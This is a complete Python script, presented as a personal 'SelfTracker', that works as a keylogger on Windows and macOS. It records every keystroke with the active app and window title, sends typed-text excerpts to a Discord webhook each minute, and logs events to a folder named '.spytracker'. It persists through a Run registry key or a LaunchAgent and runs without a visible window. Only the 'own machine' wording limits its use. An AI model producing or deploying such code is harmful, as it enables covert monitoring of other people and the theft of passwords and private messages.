#!/usr/bin/env python3
"""
SelfTracker - cross-platform personal activity tracker that reports to a
Discord webhook. Tracks foreground app usage, keystrokes and idle time.

For personal use on machines you own. Zero third-party dependencies
(stdlib only). Works on Windows and macOS.

Usage:
  tracker.py                      run the tracker in the background
  tracker.py --install            configure, register autostart, start
  tracker.py --uninstall          remove autostart and exit
  tracker.py --test               send a test message to the webhook
  tracker.py --once               run until one report is sent, then exit
  tracker.py --dry                collect a short sample and print (no send)
  tracker.py --config <path>      use an alternate config file
  tracker.py --no-keylog          disable keystroke capture for this run
"""
import ctypes
import json
import os
import platform
import queue
import signal
import socket
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request

if sys.platform == "win32":
    import ctypes.wintypes  # noqa: F401 (must be imported explicitly)

APP_NAME = "SelfTracker"
CONFIG_DIR = os.path.join(os.path.expanduser("~"), ".spytracker")
CONFIG_PATH = os.path.join(CONFIG_DIR, "config.json")
LOG_PATH = os.path.join(CONFIG_DIR, "activity.log")
EVENT_LOG_PATH = os.path.join(CONFIG_DIR, "events.jsonl")
SCRIPT_PATH = os.path.realpath(__file__)

DEFAULTS = {
    "webhook_url": "",
    "device_name": socket.gethostname(),
    "poll_interval": 2.0,        # seconds between foreground-app checks
    "key_poll": 0.02,            # seconds between keystroke polls (50 Hz)
    "report_interval": 60,       # seconds between reports to Discord
    "idle_threshold": 60,        # seconds of inactivity before counting idle
    "keylog_enabled": True,
    "include_text": True,        # include a short typed-text excerpt in reports
    "discord_detail": True,      # include per-event typed text, switches, idle ranges
    "max_text_events": 25,       # max typed-text events shown per report
    "local_log": True,           # append report summaries locally
    "log_events": True,          # append every key/switch/idle event to events.jsonl
    "autostart": True,
}

SYSTEM = platform.system()
IS_WIN = SYSTEM == "Windows"
IS_MAC = SYSTEM == "Darwin"

POLLED_VK_RANGES = [
    range(0x08, 0x0E),     # backspace, tab, enter, pause, caps, esc
    range(0x20, 0x2F),     # space .. insert
    range(0x30, 0x3A),     # 0-9
    range(0x41, 0x5B),     # A-Z
    range(0x60, 0x70),     # numpad 0-9, * + - . /
    range(0x70, 0x88),     # F1-F24
    range(0x90, 0x92),     # numlock, scroll lock
    range(0xBA, 0xC0),     # OEM keys ; , - . / `
    range(0xDB, 0xE0),     # [ \ ] '
]
POLLED_VK = [vk for r in POLLED_VK_RANGES for vk in r]

MODIFIERS = {0x10, 0x11, 0x12, 0x5B, 0x5C, 0x5D, 0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5}

VK_SPECIAL = {
    0x08: "[BACKSPACE]", 0x09: "\t", 0x0D: "\n", 0x13: "[PAUSE]",
    0x14: "[CAPSLOCK]", 0x1B: "[ESC]", 0x20: " ", 0x21: "[PGUP]",
    0x22: "[PGDN]", 0x23: "[END]", 0x24: "[HOME]", 0x25: "[LEFT]",
    0x26: "[UP]", 0x27: "[RIGHT]", 0x28: "[DOWN]", 0x2D: "[INS]",
    0x2E: "[DEL]", 0x6A: "*", 0x6B: "+", 0x6D: "-", 0x6E: ".",
    0x6F: "/", 0x90: "[NUMLOCK]", 0x91: "[SCROLL]",
}
SHIFT_DIGITS = ")!@#$%^&*("
WIN_CTRL_CHARS = {"\r": "\n", "\x7f": "[BACKSPACE]", "\x1b": "[ESC]", "\t": "\t"}


def now_str():
    return time.strftime("%Y-%m-%d %H:%M:%S")


def log_line(msg):
    line = f"{now_str()} [{APP_NAME}] {msg}"
    print(line, flush=True)
    try:
        with open(os.path.join(CONFIG_DIR, "tracker.log"), "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except OSError:
        pass


# ---------------------------------------------------------------- config ---

def load_config(path=CONFIG_PATH):
    cfg = dict(DEFAULTS)
    try:
        with open(path, "r", encoding="utf-8-sig") as f:
            cfg.update(json.load(f))
    except (OSError, ValueError):
        pass
    return cfg


def save_config(cfg, path=CONFIG_PATH):
    os.makedirs(CONFIG_DIR, exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2)


# ---------------------------------------------------------------- windows --

class _Win32:
    def __init__(self):
        self.user32 = ctypes.windll.user32
        self.kernel32 = ctypes.windll.kernel32
        wintypes = ctypes.wintypes

        self.user32.GetForegroundWindow.restype = wintypes.HWND
        self.user32.GetWindowThreadProcessId.argtypes = [wintypes.HWND, ctypes.POINTER(wintypes.DWORD)]
        self.user32.GetWindowTextW.argtypes = [wintypes.HWND, ctypes.c_wchar_p, ctypes.c_int]
        self.user32.GetAsyncKeyState.argtypes = [ctypes.c_int]
        self.user32.GetKeyState.argtypes = [ctypes.c_int]
        self.user32.MapVirtualKeyW.argtypes = [ctypes.c_uint, ctypes.c_uint]
        self.user32.MapVirtualKeyW.restype = ctypes.c_uint
        self.user32.GetKeyNameTextW.argtypes = [ctypes.c_long, ctypes.c_wchar_p, ctypes.c_int]

        self.kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
        self.kernel32.OpenProcess.restype = wintypes.HANDLE
        self.kernel32.QueryFullProcessImageNameW.argtypes = [
            wintypes.HANDLE, wintypes.DWORD, ctypes.c_wchar_p, ctypes.POINTER(wintypes.DWORD)]
        self.kernel32.CloseHandle.argtypes = [wintypes.HANDLE]

        class LASTINPUTINFO(ctypes.Structure):
            _fields_ = [("cbSize", wintypes.UINT), ("dwTime", wintypes.DWORD)]
        self.lastinputinfo = LASTINPUTINFO
        self.user32.GetLastInputInfo.argtypes = [ctypes.POINTER(LASTINPUTINFO)]
        self.GetTickCount = self.kernel32.GetTickCount

    def active_app(self):
        u, k = self.user32, self.kernel32
        hwnd = u.GetForegroundWindow()
        if not hwnd:
            return None
        pid = ctypes.wintypes.DWORD()
        u.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        title = ctypes.create_unicode_buffer(512)
        u.GetWindowTextW(hwnd, title, 512)
        app = None
        handle = k.OpenProcess(0x1000, False, pid.value)  # QUERY_LIMITED_INFORMATION
        if handle:
            buf = ctypes.create_unicode_buffer(1024)
            size = ctypes.wintypes.DWORD(ctypes.sizeof(buf))
            if k.QueryFullProcessImageNameW(handle, 0, buf, ctypes.byref(size)):
                app = os.path.basename(buf.value)
            k.CloseHandle(handle)
        if not app:
            app = title.value.strip() or f"pid-{pid.value}"
        return {"app": app, "title": title.value.strip()}

    def idle_seconds(self):
        lii = self.lastinputinfo()
        lii.cbSize = ctypes.sizeof(lii)
        if not self.user32.GetLastInputInfo(ctypes.byref(lii)):
            return 0.0
        return max(0.0, (self.GetTickCount() - lii.dwTime) / 1000.0)

    def vk_to_text(self, vk):
        shift = bool(self.user32.GetAsyncKeyState(0x10) & 0x8000)
        ctrl = bool(self.user32.GetAsyncKeyState(0x11) & 0x8000)
        if ctrl:
            return None
        caps = bool(self.user32.GetKeyState(0x14) & 1)
        if vk in VK_SPECIAL:
            return VK_SPECIAL[vk]
        if 0x30 <= vk <= 0x39:
            return SHIFT_DIGITS[vk - 0x30] if shift else chr(vk)
        if 0x41 <= vk <= 0x5A:
            ch = chr(vk)
            return ch.upper() if shift ^ caps else ch.lower()
        if 0x60 <= vk <= 0x69:
            return str(vk - 0x60)
        if 0x70 <= vk <= 0x87:
            return f"[F{vk - 0x6F}]"
        if 0xBA <= vk < 0xE0:
            scan = self.user32.MapVirtualKeyW(vk, 0)
            if scan:
                buf = ctypes.create_unicode_buffer(64)
                if self.user32.GetKeyNameTextW((scan << 16) | (1 << 30), buf, 64):
                    name = buf.value
                    if len(name) == 1:
                        return name.upper() if shift else name
                    return f"[{name}]"
        return None

    def start_key_capture(self, on_key, running):
        prev = {}

        def loop():
            for vk in POLLED_VK:
                prev[vk] = bool(self.user32.GetAsyncKeyState(vk) & 0x8000)
            time.sleep(0.1)
            while running():
                for vk in POLLED_VK:
                    pressed = bool(self.user32.GetAsyncKeyState(vk) & 0x8000)
                    if pressed and not prev.get(vk, False):
                        if vk in MODIFIERS:
                            continue
                        text = self.vk_to_text(vk)
                        on_key(text)
                    prev[vk] = pressed
                time.sleep(0.02)
        threading.Thread(target=loop, daemon=True).start()


class _MacOS:
    def __init__(self):
        self._cf = None
        self._cg = None
        self._init_ctypes()

    def _init_ctypes(self):
        try:
            self._cf = ctypes.CDLL("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")
            self._cg = ctypes.CDLL("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics")
        except OSError as e:
            log_line(f"macOS framework load failed: {e}")

    def active_app(self):
        try:
            out = subprocess.run(
                ["osascript", "-e",
                 'tell application "System Events" to get name of first application process whose frontmost is true'],
                capture_output=True, text=True, timeout=5)
            if out.returncode == 0 and out.stdout.strip():
                return {"app": out.stdout.strip(), "title": ""}
        except (OSError, subprocess.SubprocessError):
            pass
        try:
            front = subprocess.run(["lsappinfo", "front"], capture_output=True, text=True, timeout=5)
            ident = front.stdout.strip()
            if ident:
                info = subprocess.run(["lsappinfo", "info", "-only", "name", ident],
                                      capture_output=True, text=True, timeout=5)
                if info.returncode == 0 and info.stdout.strip():
                    return {"app": info.stdout.strip(), "title": ""}
        except (OSError, subprocess.SubprocessError):
            pass
        return None

    def idle_seconds(self):
        if not self._cg:
            return 0.0
        try:
            self._cg.CGEventSourceSecondsSinceLastEventType.restype = ctypes.c_double
            self._cg.CGEventSourceSecondsSinceLastEventType.argtypes = [ctypes.c_int32, ctypes.c_int32]
            return max(0.0, self._cg.CGEventSourceSecondsSinceLastEventType(1, -1))
        except Exception:
            return 0.0

    def start_key_capture(self, on_key, running):
        if not self._cg:
            log_line("macOS key capture unavailable (framework load failed)")
            return
        try:
            cg, cf = self._cg, self._cf
            kCGEventTapKeyDown = 1 << 10
            cb_type = ctypes.CFUNCTYPE(
                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_int32, ctypes.c_void_p, ctypes.c_void_p)

            def tap_callback(proxy, etype, event, ref):
                try:
                    buf = (ctypes.c_ushort * 4)()
                    cg.CGEventGetUnicodeString.argtypes = [ctypes.c_void_p, ctypes.c_ushort,
                                                           ctypes.POINTER(ctypes.c_ushort)]
                    cg.CGEventGetUnicodeString.restype = ctypes.c_ushort
                    n = cg.CGEventGetUnicodeString(event, 4, buf)
                    raw = "".join(chr(c) for c in buf[:n])
                    text = "".join(WIN_CTRL_CHARS.get(c, c) for c in raw) or "[KEY]"
                    on_key(text)
                except Exception:
                    pass
                return None

            callback = cb_type(tap_callback)
            cg.CGEventTapCreate.argtypes = [ctypes.c_int32, ctypes.c_int32, ctypes.c_int32,
                                            ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
            cg.CGEventTapCreate.restype = ctypes.c_void_p
            port = cg.CGEventTapCreate(0, 0, 1, ctypes.c_uint64(kCGEventTapKeyDown), callback, None)
            if not port:
                log_line("WARNING: key capture needs Accessibility permission "
                         "(System Settings > Privacy & Security > Accessibility); "
                         "tracker runs without keystrokes until granted.")
                return

            def runloop():
                cg.CGEventTapEnable.argtypes = [ctypes.c_void_p, ctypes.c_uint8]
                cg.CGEventTapEnable(port, True)
                cf.CFMachPortCreateRunLoopSource.restype = ctypes.c_void_p
                source = cf.CFMachPortCreateRunLoopSource(None, port, 0)
                cf.CFRunLoopAddSource.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p]
                rl = cf.CFRunLoopGetCurrent()
                cf.CFRunLoopAddSource(rl, source, ctypes.c_void_p(1))  # kCFRunLoopCommonModes
                cf.CFRunLoopRun()
            threading.Thread(target=runloop, daemon=True).start()
        except Exception as e:
            log_line(f"macOS key capture init failed: {e}")


# ---------------------------------------------------------------- deliver --

class Webhook:
    def __init__(self, url):
        self.url = url
        self._lock = threading.Lock()
        self.pending = []

    @property
    def enabled(self):
        return bool(self.url)

    def _post(self, payload):
        data = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(self.url, data=data,
                                     headers={"Content-Type": "application/json",
                                              "User-Agent": "SelfTracker/1.0 (personal activity tracker)"},
                                     method="POST")
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.status

    def send(self, text):
        if not self.enabled:
            return
        payload = {"content": text[:1950]}
        with self._lock:
            self.pending.append(payload)
            while len(self.pending) > 100:
                self.pending.pop(0)
            self._flush_locked()

    def flush(self):
        with self._lock:
            self._flush_locked()

    def _flush_locked(self):
        if not self.enabled:
            self.pending.clear()
            return
        while self.pending:
            payload = self.pending[0]
            try:
                self._post(payload)
                self.pending.pop(0)
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    wait = float(e.headers.get("Retry-After", 5) or 5)
                    log_line(f"rate limited, retrying in {wait:.0f}s")
                    time.sleep(wait)
                else:
                    log_line(f"webhook HTTP {e.code}, keeping message for retry")
                    break
            except (urllib.error.URLError, OSError, ValueError) as e:
                log_line(f"webhook failed ({e}), keeping message for retry")
                break


# ---------------------------------------------------------------- tracker --

class Tracker:
    def __init__(self, cfg, keylog=True):
        self.cfg = cfg
        self.keylog = keylog
        self.webhook = Webhook(cfg.get("webhook_url", ""))
        self.running = threading.Event()
        self.running.set()
        self.once = False
        self._platform = _Win32() if IS_WIN else _MacOS() if IS_MAC else None

        self.current = None
        self.current_since = None
        self._snap_lock = threading.Lock()
        self._snap = {"app": None, "title": ""}
        self.totals = {}            # app -> seconds, session cumulative
        self.interval = {}          # app -> seconds since last report
        self.interval_ranges = {}   # app -> {start, end} since last report
        self.switches = []          # app-switch events since last report
        self.idle_total = 0.0       # session cumulative
        self.interval_idle = 0.0    # since last report
        self._idle_start = None
        self._idle_ranges = []      # (start, end) since last report
        self.key_total = 0
        self.char_total = 0
        self.last_report = time.time()
        self._key_lock = threading.Lock()
        self._key_count = 0
        self._char_count = 0
        self._key_events = []       # {"ts","app","title","text"} per typed event

    # -- shared window snapshot (written by main loop, read by key thread)
    def _set_snap(self, app, title=""):
        with self._snap_lock:
            self._snap = {"app": app, "title": title or ""}

    def _get_snap(self):
        with self._snap_lock:
            return dict(self._snap)

    def _ts(self, ts):
        return time.strftime("%H:%M:%S", time.localtime(ts))

    # -- event log
    def _log_event(self, etype, ev):
        if not self.cfg.get("log_events", True):
            return
        try:
            os.makedirs(CONFIG_DIR, exist_ok=True)
            with open(EVENT_LOG_PATH, "a", encoding="utf-8") as f:
                f.write(json.dumps({"type": etype, **ev}, ensure_ascii=False) + "\n")
        except OSError:
            pass

    # -- key handling
    def on_key(self, text):
        snap = self._get_snap()
        ev = {"ts": time.time(), "app": snap["app"], "title": snap["title"], "text": text}
        with self._key_lock:
            self._key_count += 1
            if text and text != "[KEY]":
                self._char_count += 1
                self._key_events.append(ev)
                if len(self._key_events) > 1000:
                    self._key_events.pop(0)
        self._log_event("key", ev)

    # -- one poll tick
    def poll_once(self, now):
        threshold = self.cfg.get("idle_threshold", 60)
        idle = self._platform.idle_seconds()
        active = None
        if idle <= threshold:
            active = self._platform.active_app()
            if active and self.current and active["app"] == self.current["app"]:
                active = self.current
        if idle > threshold and self._idle_start is None:
            self._idle_start = now
            self._close_current(now)
        elif idle <= threshold and self._idle_start is not None:
            dur = now - self._idle_start
            self.idle_total += dur
            self.interval_idle += dur
            self._idle_ranges.append((self._idle_start, now))
            self._log_event("idle", {"ts": now, "from": self._idle_start,
                                     "to": now, "seconds": round(dur, 2)})
            self._idle_start = None
        if self.current is not None and (not active or active["app"] != self.current["app"]):
            self._close_current(now)
        if active and self.current is None:
            self.current = active
            self.current_since = now
            self.interval_ranges.setdefault(active["app"], {"start": now, "end": now})
            self.switches.append({"ts": now, "app": active["app"],
                                  "title": active.get("title", "")})
            self._log_event("switch", {"ts": now, "app": active["app"],
                                       "title": active.get("title", "")})
        self._set_snap(self.current["app"] if self.current else None,
                       self.current.get("title", "") if self.current else "")

    # -- loop
    def tick(self):
        if self._platform is None:
            log_line("unsupported platform: " + SYSTEM)
            return
        poll = self.cfg.get("poll_interval", 2.0)
        while self.running.is_set():
            now = time.time()
            self.poll_once(now)
            if now - self.last_report >= self.cfg.get("report_interval", 60):
                self.report()
                self.last_report = now
                if self.once:
                    self.running.clear()
            time.sleep(poll)

    def _close_current(self, now):
        if self.current and self.current_since:
            dt = now - self.current_since
            if dt > 0:
                self.totals[self.current["app"]] = self.totals.get(self.current["app"], 0.0) + dt
                self.interval[self.current["app"]] = self.interval.get(self.current["app"], 0.0) + dt
                r = self.interval_ranges.setdefault(
                    self.current["app"], {"start": self.current_since, "end": now})
                r["end"] = now
        self.current = None
        self.current_since = None

    def _sweep(self, now):
        self._close_current(now)
        if self._idle_start is not None:
            dur = now - self._idle_start
            self.idle_total += dur
            self.interval_idle += dur
            self._idle_ranges.append((self._idle_start, now))
            self._log_event("idle", {"ts": now, "from": self._idle_start,
                                     "to": now, "seconds": round(dur, 2)})
            self._idle_start = None
        return self.totals

    # -- reporting
    def report(self, send=True):
        now = time.time()
        self._sweep(now)
        with self._key_lock:
            keys, chars = self._key_count, self._char_count
            events = list(self._key_events)
            self._key_count, self._char_count = 0, 0
        self.key_total += keys
        self.char_total += chars
        interval = dict(self.interval)
        ranges = dict(self.interval_ranges)
        switches = list(self.switches)
        idle_ranges = list(self._idle_ranges)
        self.interval.clear()
        self.interval_ranges.clear()
        self.switches.clear()
        self._idle_ranges.clear()
        self.interval_idle = 0.0
        if self.cfg.get("local_log", True):
            self._log_local(now, interval, keys, events)
        self._log_event("report", {"ts": now, "interval": interval,
                                   "switches": len(switches), "keys": keys})

        lines = self._format_report(now, interval, ranges, switches, idle_ranges,
                                    keys, chars, events)
        message = "\n".join(lines)
        if not send:
            return message
        self.webhook.send(message)
        return message

    def _log_local(self, now, interval, keys, events):
        try:
            os.makedirs(CONFIG_DIR, exist_ok=True)
            detail = []
            if self.cfg.get("discord_detail", True):
                detail = [{"ts": e["ts"], "app": e["app"], "title": e["title"],
                           "text": e["text"]} for e in events]
            with open(LOG_PATH, "a", encoding="utf-8") as f:
                f.write(json.dumps({
                    "ts": now, "interval": interval, "keys": keys,
                    "events": detail,
                }, ensure_ascii=False) + "\n")
        except OSError:
            pass

    def _fmt_dur(self, seconds):
        seconds = int(seconds)
        h, m, s = seconds // 3600, (seconds % 3600) // 60, seconds % 60
        if h:
            return f"{h}h {m:02d}m"
        if m:
            return f"{m}m {s:02d}s"
        return f"{s}s"

    def _format_report(self, now, interval, ranges, switches, idle_ranges,
                       keys, chars, events):
        cfg = self.cfg
        name = cfg.get("device_name", socket.gethostname())
        rint = int(cfg.get("report_interval", 60))
        t0 = self._ts(now - rint)
        t1 = self._ts(now)
        session = self._fmt_dur(now - self.started_at)
        lines = [f"**{name}** | {t0} - {t1} | session {session}"]

        if interval:
            lines.append(f"**Apps** (last {rint}s, time range):")
            for app, secs in sorted(interval.items(), key=lambda x: -x[1])[:10]:
                r = ranges.get(app)
                span = f" ({self._ts(r['start'])}-{self._ts(r['end'])})" if r else ""
                lines.append(f"  {app}: {self._fmt_dur(secs)}{span}")
        if idle_ranges:
            lines.append("**Idle:**")
            for s, e in idle_ranges:
                lines.append(f"  {self._fmt_dur(e - s)} ({self._ts(s)}-{self._ts(e)})")
        lines.append(f"**Keys:** {keys} pressed | {chars} typed (session: {self.key_total} keys)")

        if cfg.get("discord_detail", True):
            if switches:
                lines.append("**App switches:**")
                for sw in switches[-8:]:
                    title = f" ({sw['title']})" if sw.get("title") else ""
                    lines.append(f"  {self._ts(sw['ts'])} {sw['app']}{title}")
            recent = [e for e in events if e["ts"] >= now - rint]
            max_ev = int(cfg.get("max_text_events", 25))
            if recent:
                lines.append(f"**Typed text** ({len(recent)} events, time + window):")
                for e in recent[-max_ev:]:
                    title = f" [{e['title']}]" if e.get("title") else ""
                    text = (e["text"] or "").replace("```", "'''").replace("\n", " ")
                    lines.append(f"  {self._ts(e['ts'])} {e['app'] or '?'}{title}: {text[:80]}")
        return lines

    # -- control
    def start_keylog(self):
        if not self.keylog or not self.cfg.get("keylog_enabled", True):
            log_line("keystroke capture disabled")
            return
        if self._platform:
            self._platform.start_key_capture(self.on_key, lambda: self.running.is_set())

    def stop(self):
        self.running.clear()


# ---------------------------------------------------------------- setup ----

def ensure_pythonw():
    if not IS_WIN:
        return sys.executable
    py = sys.executable
    if py.lower().endswith("pythonw.exe"):
        return py
    dirname = os.path.dirname(py)
    cand = os.path.join(dirname, "pythonw.exe")
    return cand if os.path.exists(cand) else py


def register_autostart(cfg):
    if not cfg.get("autostart", True):
        return
    if IS_WIN:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        cmd = f'"{ensure_pythonw()}" "{SCRIPT_PATH}"'
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(key)
        log_line("autostart registered (HKCU Run key)")
    elif IS_MAC:
        plist_dir = os.path.expanduser("~/Library/LaunchAgents")
        os.makedirs(plist_dir, exist_ok=True)
        plist = os.path.join(plist_dir, "com.self-tracker.plist")
        content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.self-tracker</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{SCRIPT_PATH}</string>
    </array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
    <key>StandardOutPath</key><string>{os.path.join(CONFIG_DIR, "launchd.out.log")}</string>
    <key>StandardErrorPath</key><string>{os.path.join(CONFIG_DIR, "launchd.err.log")}</string>
</dict>
</plist>
"""
        with open(plist, "w", encoding="utf-8") as f:
            f.write(content)
        subprocess.run(["launchctl", "unload", plist], capture_output=True, timeout=10)
        subprocess.run(["launchctl", "load", "-w", plist], capture_output=True, timeout=10)
        log_line(f"autostart registered (LaunchAgent {plist})")
    else:
        log_line("autostart not supported on this platform")


def unregister_autostart():
    if IS_WIN:
        import winreg
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, APP_NAME)
            winreg.CloseKey(key)
            log_line("autostart removed")
        except FileNotFoundError:
            log_line("no autostart entry found")
    elif IS_MAC:
        plist = os.path.expanduser("~/Library/LaunchAgents/com.self-tracker.plist")
        subprocess.run(["launchctl", "unload", plist], capture_output=True, timeout=10)
        if os.path.exists(plist):
            os.remove(plist)
            log_line("LaunchAgent removed")
        else:
            log_line("no LaunchAgent found")


def prompt_webhook(cfg):
    if cfg.get("webhook_url"):
        return cfg
    print("Paste your Discord webhook URL (create one in a server: "
          "channel settings > Integrations > Webhooks).")
    url = input("Webhook URL (empty to run local-log only): ").strip()
    if url:
        cfg["webhook_url"] = url
        save_config(cfg)
    return cfg


def spawn_background():
    if IS_WIN:
        cmd = f'"{ensure_pythonw()}" "{SCRIPT_PATH}"'
        subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        log_line("tracker launched in background")
    else:
        subprocess.Popen([sys.executable, SCRIPT_PATH],
                         start_new_session=True,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        log_line("tracker launched in background")


def main():
    args = sys.argv[1:]
    cfg_path = CONFIG_PATH
    if "--config" in args:
        i = args.index("--config")
        cfg_path = args[i + 1]
    keylog = "--no-keylog" not in args

    cfg = load_config(cfg_path)
    tracker = Tracker(cfg, keylog=keylog)

    if "--dry" in args:
        tracker.started_at = time.time()
        tracker.start_keylog()
        log_line("collecting 8s sample...")
        end = time.time() + 8
        poll = cfg.get("poll_interval", 2.0)
        while time.time() < end:
            tracker.poll_once(time.time())
            time.sleep(poll)
        print(tracker.report(send=False))
        return

    if "--test" in args:
        tracker.started_at = time.time()
        tracker.webhook.send(f"**{cfg.get('device_name')}** self-tracker online. "
                             f"Reporting every {cfg.get('report_interval')}s.")
        tracker.webhook.flush()
        log_line("test message sent" if tracker.webhook.enabled else "no webhook configured")
        return

    if "--install" in args:
        cfg = prompt_webhook(cfg)
        register_autostart(cfg)
        spawn_background()
        print(f"\nSelfTracker installed.\n- Config:  {cfg_path}\n- Log:     {LOG_PATH}\n"
              f"- Webhook: {'configured' if cfg.get('webhook_url') else 'NOT set (local log only)'}")
        print("Edit the config any time and restart to apply.")
        return

    if "--uninstall" in args:
        unregister_autostart()
        print("Autostart removed. Kill any running tracker process to stop it "
              "(Task Manager / Activity Monitor, process name: python/pythonw).")
        return

    # normal run
    tracker.started_at = time.time()
    signal.signal(signal.SIGINT, lambda *_: tracker.stop())
    signal.signal(signal.SIGTERM, lambda *_: tracker.stop())
    tracker.once = "--once" in args
    if tracker.once:
        log_line("once mode: will exit after the first report")

    if tracker.webhook.enabled:
        tracker.webhook.send(f"**{cfg.get('device_name')}** tracker started. "
                             f"Reporting every {cfg.get('report_interval')}s.")
    log_line(f"tracker running on {SYSTEM} (pid {os.getpid()})"
             + ("" if tracker.webhook.enabled else " [no webhook - local log only]"))

    tracker.start_keylog()
    try:
        tracker.tick()
    except KeyboardInterrupt:
        pass
    finally:
        tracker._sweep(time.time())
        if tracker.webhook.enabled:
            tracker.webhook.send(f"**{cfg.get('device_name')}** tracker stopped. "
                                 f"Session: {tracker._fmt_dur(time.time() - tracker.started_at)}")
            tracker.webhook.flush()
        log_line("tracker stopped")


if __name__ == "__main__":
    main()
